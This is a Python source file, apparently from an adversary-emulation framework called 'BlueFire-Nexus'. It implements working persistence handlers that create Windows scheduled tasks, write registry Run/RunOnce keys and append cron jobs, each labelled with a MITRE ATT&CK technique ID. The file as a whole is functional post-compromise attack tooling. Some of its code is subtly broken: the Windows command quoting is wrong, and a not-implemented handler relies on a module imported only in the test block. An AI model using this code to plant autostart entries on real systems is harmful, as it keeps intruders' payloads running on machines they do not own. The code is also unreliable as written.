"""
Consolidated Persistence Module
Handles persistence for all APT implementations
"""

import os
import sys
import time
import random
import string
import hashlib
import base64
from typing import Dict, List, Any, Optional, TYPE_CHECKING
from datetime import datetime
from pathlib import Path
import logging
import platform
import shlex # For safe command splitting

# Avoid circular import for type hinting
if TYPE_CHECKING:
    from ..execution.execution import Execution 

class Persistence:
    """Handles establishing persistence using various techniques."""
    
    def __init__(self, execution_module: 'Execution'):
        self.execution_module = execution_module
        self.config = {
            "persistence_timeout": 120, # Default timeout for persistence commands
            "default_task_trigger": "ONLOGON", # Default trigger for scheduled tasks
            "default_run_key_hive": "HKCU", # Default registry hive (Current User)
            "default_cron_schedule": "@reboot", # Default cron schedule (@reboot, @hourly, or standard cron syntax)
        }
        self.logger = logging.getLogger(__name__)
        if not execution_module:
            self.logger.error("Persistence module initialized WITHOUT Execution module. Real persistence will fail.")
            # raise ValueError("Execution module is required for Persistence module")

    def update_config(self, config: Dict[str, Any]):
        """Update internal config with loaded configuration."""
        self.config.update(config.get("persistence", {}))
        self.logger.info("Persistence module configuration updated.")

    def establish_persistence(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence based on the requested technique."""
        result = {
            "status": "success",
            "timestamp": datetime.now().isoformat(),
            "results": {}
        }
        errors = []

        persistence_requests = data.get("persist", {}) # e.g., {"technique": "scheduled_task", "details": {...}}
        technique = persistence_requests.get("technique")
        details = persistence_requests.get("details", {})

        if not technique:
             return {"status": "error", "message": "Missing 'technique' in persistence request data."} 

        handler_map = {
            "scheduled_task": self._handle_scheduled_task,
            "registry_run_key": self._handle_registry_run_key,
            "cron_job": self._handle_cron_job,
            # Add other techniques here
            "dns": self._handle_not_implemented, # Mark network methods as NI for now
            "dhcp": self._handle_not_implemented,
            "proxy": self._handle_not_implemented,
            # Deprecated/Simulated - redirect to NI or remove
            "run": self._handle_not_implemented, 
            "service": self._handle_not_implemented,
            "task": self._handle_not_implemented,
            "startup": self._handle_not_implemented,
            "association": self._handle_not_implemented,
            "boot": self._handle_not_implemented, 
        }

        handler = handler_map.get(technique)

        if handler:
            try:
                persistence_result = handler(details)
                result["results"][technique] = persistence_result
                if persistence_result.get("status") == "failure":
                    result["status"] = "partial_success" # Mark main status if sub-task failed
                    errors.append(f"Technique '{technique}' failed: {persistence_result.get('details', {}).get('error', 'Unknown reason')}")
            except Exception as e:
                error_msg = f"Persistence technique '{technique}' failed: {e}"
                errors.append(error_msg)
                self._log_error(error_msg, exc_info=True)
                result["results"][technique] = {"status": "error", "message": str(e)}
        else:
            error_msg = f"Unsupported or unknown persistence technique requested: {technique}"
            errors.append(error_msg)
            self._log_error(error_msg)
            result["results"][technique] = {"status": "error", "message": error_msg}

        if errors:
            result["status"] = "failure" if not result["results"] or all(v.get("status") == "error" for v in result["results"].values()) else "partial_success"
            result["errors"] = errors
            
        return result
        
    def _execute_command(self, command: str, method: str = "direct", capture: bool = True) -> Dict[str, Any]:
        """Helper to execute commands via the Execution module."""
        if not self.execution_module:
             self.logger.error("Execution module not available.")
             return {"status": "error", "message": "Execution module unavailable"}
             
        exec_data = {
             "execute": {
                  "command": {
                       "cmd": command,
                       "method": method,
                       "capture_output": capture
                  }
             }
        }
        try:
            exec_result = self.execution_module.execute(exec_data)
            # Return the inner command execution result for simplicity
            return exec_result.get("results", {}).get("command_execution", {"status": "error", "message": "Execution result format unexpected"})
        except Exception as e:
            self.logger.error(f"Failed to execute command '{command}' via Execution module: {e}", exc_info=True)
            return {"status": "error", "message": f"Execution failed: {e}"}

    def _handle_scheduled_task(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence using Windows Scheduled Tasks."""
        os_type = platform.system()
        if os_type != "Windows":
             return {"status": "skipped", "message": f"Scheduled Task persistence only applicable on Windows (OS: {os_type})"}
             
        task_name = details.get("task_name", f"BlueFireTask_{self._generate_random_string(6)}")
        command = details.get("command") # Command or path to execute
        trigger = details.get("trigger", self.config.get("default_task_trigger", "ONLOGON")).upper() # e.g., ONLOGON, ONSTART, HOURLY, DAILY
        run_as = details.get("run_as") # Optional: Specify user context like SYSTEM
        force = details.get("force", True) # Overwrite task if exists
        run_level = details.get("run_level", "HIGHEST") # L LIMITED, HIGHEST
        description = details.get("description", "BlueFire-Nexus Persistence Task")

        if not command:
            return {"status": "error", "message": "Missing 'command' detail for scheduled task."}
            
        self.logger.info(f"Attempting to create scheduled task: {task_name} triggered {trigger}")
        
        # Build schtasks command
        cmd_parts = [
            "schtasks", "/create",
            "/tn", shlex.quote(task_name),
            "/tr", shlex.quote(command), # Quote the command/path
            "/sc", trigger
        ]
        if run_as:
            cmd_parts.extend(["/ru", run_as])
        if force:
            cmd_parts.append("/f")
        if run_level == "HIGHEST":
             cmd_parts.append("/rl")
             cmd_parts.append("HIGHEST")
        if description:
             cmd_parts.extend(["/d", shlex.quote(description)])
             
        # Add modifiers based on trigger (e.g., /mo for MINUTE/HOURLY)
        # Add /st for specific times etc. - More complex triggers need more args
        # Example: HOURLY needs /mo <minutes>
        if trigger in ["MINUTE", "HOURLY", "DAILY", "WEEKLY", "MONTHLY"]:
             modifier = details.get("modifier") # e.g., for HOURLY, modifier=60 means every 60 hours (if not specified, default is 1)
             if modifier:
                  cmd_parts.extend(["/mo", str(modifier)])
        
        full_command = " ".join(cmd_parts)
        
        exec_result = self._execute_command(full_command, method="cmd")
        
        result_details = {
            "command_executed": full_command,
            "task_name": task_name,
            "trigger": trigger,
            "command_persisted": command,
            "execution_stdout": exec_result.get("details", {}).get("stdout"),
            "execution_stderr": exec_result.get("details", {}).get("stderr"),
            "execution_return_code": exec_result.get("details", {}).get("return_code")
        }

        if exec_result.get("status") == "success" and exec_result.get("details", {}).get("return_code") == 0:
            status = "success"
            self.logger.info(f"Successfully created scheduled task: {task_name}")
        else:
            status = "failure"
            result_details["error"] = exec_result.get("details", {}).get("stderr") or exec_result.get("message", "Execution failed")
            self.logger.error(f"Failed to create scheduled task: {task_name}. Error: {result_details['error']}")

        return {
            "status": status,
            "technique": "scheduled_task",
            "mitre_technique_id": "T1053.005", 
            "mitre_technique_name": "Scheduled Task/Job: Scheduled Task",
            "timestamp": datetime.now().isoformat(),
            "details": result_details
        }

    def _handle_registry_run_key(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence using Windows Registry Run/RunOnce keys."""
        os_type = platform.system()
        if os_type != "Windows":
             return {"status": "skipped", "message": f"Registry persistence only applicable on Windows (OS: {os_type})"}
             
        value_name = details.get("value_name", f"BlueFirePayload_{self._generate_random_string(6)}")
        command = details.get("command") # Command or path to execute
        hive = details.get("hive", self.config.get("default_run_key_hive", "HKCU")).upper()
        key_type = details.get("key_type", "Run").capitalize() # Run, RunOnce
        force = details.get("force", True)

        if not command:
            return {"status": "error", "message": "Missing 'command' detail for registry run key."}
            
        if hive not in ["HKCU", "HKLM"]:
             return {"status": "error", "message": f"Invalid registry hive specified: {hive}. Use HKCU or HKLM."}
        if key_type not in ["Run", "RunOnce"]:
             return {"status": "error", "message": f"Invalid key type specified: {key_type}. Use Run or RunOnce."}

        registry_key = f"{hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\{key_type}"
        
        self.logger.info(f"Attempting to set registry key: \"{registry_key}\" - {value_name}")

        # Build reg add command (Ensure command path uses backslashes for reg.exe)
        command_for_reg = command.replace("/", "\\")
        cmd_parts = [
            "reg", "add",
            f'"{registry_key}"', # Use single quotes for f-string, double inside
            "/v", shlex.quote(value_name), # Quote value name
            "/t", "REG_SZ",
            "/d", f'"{command_for_reg}"' # Use single quotes for f-string, double inside
        ]
        if force:
            cmd_parts.append("/f")
            
        full_command = " ".join(cmd_parts)
        
        exec_result = self._execute_command(full_command, method="cmd")
        
        result_details = {
            "command_executed": full_command,
            "registry_key": registry_key,
            "value_name": value_name,
            "command_persisted": command,
            "execution_stdout": exec_result.get("details", {}).get("stdout"),
            "execution_stderr": exec_result.get("details", {}).get("stderr"),
            "execution_return_code": exec_result.get("details", {}).get("return_code")
        }

        if exec_result.get("status") == "success" and exec_result.get("details", {}).get("return_code") == 0:
            status = "success"
            self.logger.info(f"Successfully set registry key: {registry_key} - {value_name}")
        else:
            status = "failure"
            result_details["error"] = exec_result.get("details", {}).get("stderr") or exec_result.get("message", "Execution failed")
            self.logger.error(f"Failed to set registry key: {registry_key} - {value_name}. Error: {result_details['error']}")

        return {
            "status": status,
            "technique": "registry_run_key",
            "mitre_technique_id": "T1547.001", 
            "mitre_technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
            "timestamp": datetime.now().isoformat(),
            "details": result_details
        }

    def _handle_cron_job(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence using cron jobs on Linux/macOS."""
        os_type = platform.system()
        if os_type not in ["Linux", "Darwin"]:
            return {"status": "skipped", "message": f"Cron Job persistence only applicable on Linux/macOS (OS: {os_type})"}

        command = details.get("command") # Command or path to execute
        schedule = details.get("schedule", self.config.get("default_cron_schedule", "@reboot"))
        comment = details.get("comment", f"BlueFire-Nexus Persistence {self._generate_random_string(4)}")
        # Note: Adding jobs for other users requires root privileges usually.
        # This implementation targets the current user's crontab.

        if not command:
            return {"status": "error", "message": "Missing 'command' detail for cron job."}

        self.logger.info(f"Attempting to add cron job: schedule='{schedule}', command='{command}'")

        # Construct the cron line
        cron_line = f"{schedule} {command} # {comment}"
        
        # Commands to add the line to crontab safely
        # 1. Get current crontab content
        # 2. Append the new line (if not already present based on comment)
        # 3. Load the modified content
        # Using shell piping for simplicity here. Careful with quoting.
        # Escape cron_line for shell command within shell command
        cron_line_escaped = shlex.quote(cron_line)
        comment_escaped = shlex.quote(comment)
        # Command checks if comment exists, if not, appends line, then loads
        # (crontab -l ; echo <line>) | crontab -
        # Safer: (crontab -l | grep -F -q <comment> || (crontab -l ; echo <line>)) | crontab -
        add_cron_cmd = f"(crontab -l 2>/dev/null | grep -F -q {comment_escaped} || (crontab -l 2>/dev/null ; echo {cron_line_escaped})) | crontab -"
        
        # Execute using bash -c
        exec_result = self._execute_command(add_cron_cmd, method="bash", capture=True)

        result_details = {
            "command_executed": add_cron_cmd,
            "cron_schedule": schedule,
            "command_persisted": command,
            "cron_comment": comment,
            "execution_stdout": exec_result.get("details", {}).get("stdout"),
            "execution_stderr": exec_result.get("details", {}).get("stderr"),
            "execution_return_code": exec_result.get("details", {}).get("return_code")
        }
        status = "failure" # Default status

        if exec_result.get("status") == "success": # Check general execution success
            # Verify if the line was actually added
            verify_cmd = f"crontab -l 2>/dev/null | grep -F {comment_escaped}"
            verify_result = self._execute_command(verify_cmd, method="bash", capture=True)
            if verify_result.get("status") == "success" and verify_result.get("details", {}).get("return_code") == 0:
                 status = "success"
                 self.logger.info(f"Successfully added/verified cron job with comment: {comment}")
                 result_details["verification_status"] = "success"
                 result_details["added_line"] = verify_result.get("details", {}).get("stdout", "").strip()
            else:
                 # Status remains failure
                 error_msg = f"Failed to verify cron job addition (Comment: {comment}). Stderr: {verify_result.get('details', {}).get('stderr')}"
                 result_details["error"] = error_msg
                 result_details["verification_status"] = "failure"
                 self.logger.error(error_msg)
        else:
            # Status remains failure
            result_details["error"] = exec_result.get("details", {}).get("stderr") or exec_result.get("message", "Execution failed")
            self.logger.error(f"Failed to execute crontab command. Error: {result_details['error']}")

        return {
            "status": status,
            "technique": "cron_job",
            "mitre_technique_id": "T1053.003", 
            "mitre_technique_name": "Scheduled Task/Job: Cron",
            "timestamp": datetime.now().isoformat(),
            "details": result_details
        }

    def _handle_not_implemented(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Placeholder for techniques not yet realistically implemented."""
        technique_name = inspect.currentframe().f_back.f_code.co_name.replace("_handle_", "")
        self.logger.warning(f"Persistence technique '{technique_name}' is not yet implemented with realistic actions.")
        return {
            "status": "skipped", 
            "message": f"Technique '{technique_name}' not realistically implemented.",
            "technique": technique_name,
            "timestamp": datetime.now().isoformat(),
            "details": details # Pass details through
        }

    # --- Deprecated / Placeholder Handlers --- 
    # These are the old handlers that returned simulated data or handled network types.
    # Keep them temporarily and redirect to _handle_not_implemented or remove.

    # def _handle_run(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
    # def _handle_service(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
    # def _handle_task(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
    # def _handle_startup(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
    # def _handle_association(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
    # def _handle_boot(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
    # def _handle_dns(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
    # def _handle_dhcp(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
    # def _handle_proxy(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
    # def _handle_proxy_persistence(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data) 
    
    # Remove the old _apply_* methods if they exist
    # def _apply_registry(...): pass
    # def _apply_filesystem(...): pass
    # def _apply_network(...): pass

    def _log_error(self, message: str, exc_info=False) -> None:
        """Log errors using the initialized logger."""
        self.logger.error(message, exc_info=exc_info)
        
    def _generate_random_string(self, length: int = 8) -> str:
        """Generate a random string of fixed length."""
        letters = string.ascii_lowercase + string.digits
        return ''.join(random.choice(letters) for i in range(length))

# Example Usage (for testing)
if __name__ == '__main__':
    import json
    import inspect # Needed for _handle_not_implemented helper
    
    # Basic logging setup for testing
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

    # Mock Execution module for standalone testing
    class MockExecution:
        def execute(self, data: Dict[str, Any]) -> Dict[str, Any]:
            cmd_details = data.get("execute", {}).get("command", {})
            cmd = cmd_details.get("cmd")
            print(f"[MockExecution] Received command: {cmd}")
            # Simulate success for testing logic (actual command won't run)
            return {
                "results": {
                    "command_execution": {
                        "status": "success",
                        "technique": "command_execution_mock",
                        "mitre_technique_id": "T1059",
                        "mitre_technique_name": "Command and Scripting Interpreter",
                        "timestamp": datetime.now().isoformat(),
                        "details": {
                            "command_executed": cmd,
                            "execution_method": cmd_details.get("method"),
                            "return_code": 0,
                            "stdout": "Mock execution successful.",
                            "stderr": ""
                        }
                    }
                }
            }

    mock_exec = MockExecution()
    persistence_module = Persistence(execution_module=mock_exec)
    # persistence_module.update_config({}) # Load actual config here if needed

    print("\n--- Testing Scheduled Task (Windows) ---")
    if platform.system() == "Windows":
        task_request = {"persist": {"technique": "scheduled_task", "details": {
            "command": "C:\\Windows\\System32\\calc.exe",
            "task_name": "BlueFireCalcTest",
            "trigger": "ONLOGON"
        }}}
        task_result = persistence_module.establish_persistence(task_request)
        print(json.dumps(task_result, indent=2))
    else:
        print("Skipping Scheduled Task test (not Windows)")

    print("\n--- Testing Registry Run Key (Windows) ---")
    if platform.system() == "Windows":
        reg_request = {"persist": {"technique": "registry_run_key", "details": {
            "command": "C:\\path\\to\\payload.exe",
            "value_name": "BlueFireRegTest",
            "hive": "HKCU",
            "key_type": "Run"
        }}}
        reg_result = persistence_module.establish_persistence(reg_request)
        print(json.dumps(reg_result, indent=2))
    else:
        print("Skipping Registry Run Key test (not Windows)")

    print("\n--- Testing Cron Job (Linux/macOS) ---")
    if platform.system() in ["Linux", "Darwin"]:
        cron_request = {"persist": {"technique": "cron_job", "details": {
            "command": "/usr/bin/touch /tmp/bluefire_cron_was_here",
            "schedule": "*/5 * * * *" # Every 5 minutes
        }}}
        cron_result = persistence_module.establish_persistence(cron_request)
        print(json.dumps(cron_result, indent=2))
    else:
        print("Skipping Cron Job test (not Linux/macOS)")
        
    print("\n--- Testing Not Implemented Technique ---")
    ni_request = {"persist": {"technique": "dhcp", "details": {}}}
    ni_result = persistence_module.establish_persistence(ni_request)
    print(json.dumps(ni_result, indent=2)) 